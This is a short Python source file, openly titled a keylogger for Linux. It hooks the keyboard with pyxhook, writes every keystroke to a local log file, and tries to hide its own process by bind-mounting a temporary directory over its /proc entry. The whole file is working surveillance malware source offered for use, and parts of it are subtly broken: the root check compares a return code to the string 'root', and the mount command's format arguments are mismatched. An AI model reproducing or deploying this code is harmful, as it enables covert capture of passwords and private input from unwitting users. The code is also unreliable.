# Python code for keylogger 
# to be used in linux 
import os 
import pyxhook 
import string
import random

def hide_process():
	ch = string.uppercase + string.digits
	# Bind mount - works with root on linux
	token = "".join(random.choice(ch) for i in range(32))
	pid = os.getpid()
	print "[+] Current PID: {0}".format(pid)
	if os.path.isdir("/tmp/{0}".format(token)) is False:
		if os.system("sudo whoami") == 'root':
			os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token))
  
# set file to log keystrokes
log_file = "./file.log"
  
#creating key pressing event and saving it into log file 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key)) 
  
# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
# set the hook 
new_hook.HookKeyboard()
#Hide process
hide_process()
try: 
    new_hook.start()         # start the hook 
except KeyboardInterrupt: 
    # User cancelled from command line. 
    pass
except Exception as ex: 
    # Write exceptions to the log file, for analysis later. 
    msg = 'Error while catching events:\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('\n{}'.format(msg)) 
